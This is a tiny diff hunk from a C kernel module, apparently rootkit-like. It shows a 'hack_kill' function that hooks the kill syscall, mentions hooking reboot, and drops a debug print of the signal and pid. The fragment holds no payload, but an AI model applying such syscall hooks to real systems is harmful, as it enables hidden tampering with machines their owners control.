@@ -234,7 +234,6 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
             printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
         }
     }
-    printk(KERN_INFO "kill %d, %d\n", sig, pid);
     return orig_kill(regs);
 }
 #else
